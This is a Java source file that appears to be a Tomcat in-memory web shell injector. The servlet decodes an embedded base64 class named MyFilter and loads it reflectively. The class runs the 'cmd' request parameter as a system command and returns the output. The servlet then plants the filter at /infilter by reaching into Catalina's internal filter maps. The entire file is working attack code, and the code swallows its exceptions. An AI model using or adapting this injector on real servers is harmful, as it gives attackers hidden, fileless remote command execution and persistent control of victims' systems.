package com.axisx;

import sun.misc.BASE64Decoder;

import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.EventListener;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;

public class InjectFilterByServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String filterName= "MyFilter";
        String urlPattern="/infilter";
        try{
            ClassLoader classLoader=Thread.currentThread().getContextClassLoader();
            String ListenerBase64="yv66vgAAADQA2AoAKwB6CQB7AHwIAH0KAH4AfwcAgAoAKgCBCACCCwAFAIMKACoAhAsAJwCFCgCGAH8KAIYAhwsAiACJBwCKCgAOAIsKAIwAjQoAjACOCgCPAJAHAJEKABMAkgcAkwoAFQCUBwCVCgAXAHoKABUAlgcAlwoAGgB6CgAaAJgIAJkKABoAmgoAFwCbCgAXAJoKACsAnAoAnQCeCACfCgCdAKAKAKEAogoAoQCjBwCkCAClCACmBwCnBwCoBwCpAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAApMTXlGaWx0ZXI7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7AQAKRXhjZXB0aW9ucwcAqgEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABHJlc3ABAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGcmVzdWx0AQADb3V0AQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADnNlcnZsZXRSZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAPc2VydmxldFJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAC2ZpbHRlckNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47AQADcmVxAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQANU3RhY2tNYXBUYWJsZQcApwcAqwcArAcArQcAgAcAigcArgEAC0NvbW1hbmRFeGVjAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAJydAEAE0xqYXZhL2xhbmcvUnVudGltZTsBAARwcm9jAQATTGphdmEvbGFuZy9Qcm9jZXNzOwEABnN0ZGVycgEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAA2lzcgEAG0xqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyOwEAAmJyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAEbGluZQEAAnNiAQAYTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7BwCvBwCwBwCxBwCyBwCRBwCTBwCVAQAWZ2V0UmVzcG9uc2VGcm9tUmVxdWVzdAEAUShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDspTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEABHZhcjMBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAEdmFyNAEABHZhcjUBABJMamF2YS9sYW5nL09iamVjdDsBAAR2YXI2AQAEdmFyOAEABHZhcjEBAAR2YXIyBwCkAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBAA1NeUZpbHRlci5qYXZhDAAtAC4HALMMAEEAtAEADUZpbHRlciDliJvlu7oHALUMALYAtwEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QMAGsAbAEABmZpbHRlcgwAuABWDABVAFYMALkAugcAuwwAvAAuBwCtDAA6AL0BABNqYXZhL2xhbmcvRXhjZXB0aW9uDAC+AC4HALAMAL8AwAwAwQDCBwCxDADDAMQBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDAAtAMUBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyDAAtAMYBABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyDADHAMgBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAyQDKAQABCgwAywDIDADJAMwMAM0AzgcAzwwA0ADOAQAIcmVzcG9uc2UMANEA0gcA0wwA1ADVDADWANcBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAB3JlcXVlc3QBABBGaWx0ZXIg6ZSA5q+B77yBAQAITXlGaWx0ZXIBABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9TdHJpbmcBABFqYXZhL2xhbmcvUnVudGltZQEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JbnB1dFN0cmVhbQEAEGphdmEvbGFuZy9TeXN0ZW0BABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADGdldFBhcmFtZXRlcgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABWZsdXNoAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEAD3ByaW50U3RhY2tUcmFjZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBACwoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAD2phdmEvbGFuZy9DbGFzcwEADWdldFN1cGVyY2xhc3MBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7ACEAKgArAAEALAAAAAYAAQAtAC4AAQAvAAAALwABAAEAAAAFKrcAAbEAAAACADAAAAAGAAEAAAAHADEAAAAMAAEAAAAFADIAMwAAAAEANAA1AAIALwAAAEEAAgACAAAACbIAAhIDtgAEsQAAAAIAMAAAAAoAAgAAAAoACAALADEAAAAWAAIAAAAJADIAMwAAAAAACQA2ADcAAQA4AAAABAABADkAAQA6ADsAAgAvAAABIwADAAkAAABJK8AABToEKhkEtgAGOgUZBBIHuQAIAgA6BioZBrYACToHGQW5AAoBADoIGQgZB7YACxkItgAMLSssuQANAwCnAAo6BRkFtgAPsQABAAYAPgBBAA4AAwAwAAAAMgAMAAAADwAGABIADgATABkAFAAhABYAKgAXADEAGAA2ABkAPgAcAEEAGgBDABsASAAfADEAAABmAAoADgAwADwAPQAFABkAJQA+AD8ABgAhAB0AQAA/AAcAKgAUAEEAQgAIAEMABQBDAEQABQAAAEkAMgAzAAAAAABJAEUARgABAAAASQBHAEgAAgAAAEkASQBKAAMABgBDAEsATAAEAE0AAAAcAAL/AEEABQcATgcATwcAUAcAUQcAUgABBwBTBgA4AAAACAADAFQAOQBUAAEAVQBWAAIALwAAASkAAwAJAAAAYLgAEE0sK7YAEU4ttgASOgS7ABNZGQS3ABQ6BbsAFVkZBbcAFjoGAToHuwAXWbcAGDoIGQa2ABlZOgfGACAZCLsAGlm3ABsZB7YAHBIdtgActgAetgAfV6f/2xkItgAgsAAAAAMAMAAAACoACgAAACIABAAjAAoAJAAQACUAGwAmACYAJwApACgAMgApAD0AKgBaACwAMQAAAFwACQAAAGAAMgAzAAAAAABgAD4APwABAAQAXABXAFgAAgAKAFYAWQBaAAMAEABQAFsAXAAEABsARQBdAF4ABQAmADoAXwBgAAYAKQA3AGEAPwAHADIALgBiAGMACABNAAAAJQAC/wAyAAkHAE4HAGQHAGUHAGYHAGcHAGgHAGkHAGQHAGoAACcAOAAAAAQAAQAOACEAawBsAAEALwAAAU0AAgAHAAAAYQFNK7YAIbYAIhIjtgAkTi0EtgAlLSu2ACbAACdNpwBCTiu2ACESKLYAJDoEGQQEtgAlGQQrtgAmOgUZBbYAIbYAIhIjtgAkOgYZBgS2ACUZBhkFtgAmwAAnTacABToELLAAAgACAB0AIAAOACEAWgBdAA4AAwAwAAAAPgAPAAAAMAACADMADwA0ABQANQAdAEAAIAA2ACEAOAAsADkAMgA6ADoAOwBJADwATwA9AFoAPwBdAD4AXwBCADEAAABSAAgADwAOAG0AbgADACwALgBvAG4ABAA6ACAAcABxAAUASQARAHIAbgAGACEAPgBzAEQAAwAAAGEAMgAzAAAAAABhAHQATAABAAIAXwB1AD0AAgBNAAAALgAD/wAgAAMHAE4HAFIHAHYAAQcAU/8APAAEBwBOBwBSBwB2BwBTAAEHAFP6AAEAAQB3AC4AAQAvAAAANwACAAEAAAAJsgACEim2AASxAAAAAgAwAAAACgACAAAARgAIAEcAMQAAAAwAAQAAAAkAMgAzAAAAAQB4AAAAAgB5";
            byte[] FilterClass = new BASE64Decoder().decodeBuffer(ListenerBase64);

            Method defineClass1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass1.setAccessible(true);
            Class filterClass = (Class) defineClass1.invoke(classLoader, FilterClass, 0, FilterClass.length);

            Filter filterObject=(Filter)filterClass.newInstance();

            Object context=getContext();
            Method mf=context.getClass().getSuperclass().getSuperclass().getDeclaredMethod("findFilterConfig",String.class);
            mf.setAccessible(true);
            if(mf.invoke(context,filterName)==null) {
                Constructor<?>[] consFilterDef = Class.forName("org.apache.catalina.deploy.FilterDef").getDeclaredConstructors();
                consFilterDef[0].setAccessible(true);
                Object filterDef = consFilterDef[0].newInstance();
                Method m2 = filterDef.getClass().getDeclaredMethod("setFilterName", String.class);
                m2.setAccessible(true);
                m2.invoke(filterDef, filterName);
                Method m3 = filterDef.getClass().getDeclaredMethod("setFilter", Filter.class);
                m3.setAccessible(true);
                m3.invoke(filterDef, filterObject);
                Constructor<?>[] consFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
                consFilterConfig[0].setAccessible(true);
                Object config = consFilterConfig[0].newInstance(context, filterDef);

                Constructor<?>[] consFilterMap = Class.forName("org.apache.catalina.deploy.FilterMap").getDeclaredConstructors();
                consFilterMap[0].setAccessible(true);
                Object filterMap = consFilterMap[0].newInstance();

                Method m4 = filterMap.getClass().getDeclaredMethod("setFilterName", String.class);
                m4.setAccessible(true);
                m4.invoke(filterMap, filterName);

                Method m5 = filterMap.getClass().getDeclaredMethod("setURLPattern", String.class);
                m5.setAccessible(true);
                m5.invoke(filterMap, urlPattern);

                Field filterConfigsField = context.getClass().getSuperclass().getSuperclass().getDeclaredField("filterConfigs");
                filterConfigsField.setAccessible(true);
                HashMap<String, Object> filterConfigs = (HashMap<String, Object>) filterConfigsField.get(context);
                filterConfigs.put(filterName, config);

                Field filterMapField = context.getClass().getSuperclass().getSuperclass().getDeclaredField("filterMaps");
                filterMapField.setAccessible(true);
                List object = (List) filterMapField.get(context);

                object.add(filterMap);
            }
        }catch (Exception e){}

    }

    public Object getContext() throws NoSuchFieldException, IllegalAccessException {
        ThreadGroup threadGroup=Thread.currentThread().getThreadGroup();
        Field f1=threadGroup.getClass().getDeclaredField("threads");
        f1.setAccessible(true);
        Thread[] threads=(Thread[])f1.get(threadGroup);

        for(Thread thread:threads) {
            try {
                Field fname = thread.getClass().getDeclaredField("name");
                fname.setAccessible(true);
                String  chars = (String) fname.get(thread);

                if (chars.contains("ContainerBackgroundProcessor") && chars.matches(".*StandardContext\\[/.+\\]")){
                    Field f2 = thread.getClass().getDeclaredField("target");
                    f2.setAccessible(true);
                    Object target = f2.get(thread);
                    Field f3 = target.getClass().getDeclaredField("this$0");
                    f3.setAccessible(true);
                    Object this0 = f3.get(target);
                    return this0;
                }
            }catch (Exception e){
                System.out.println(e);
            }
        }
        return null;
    }
}
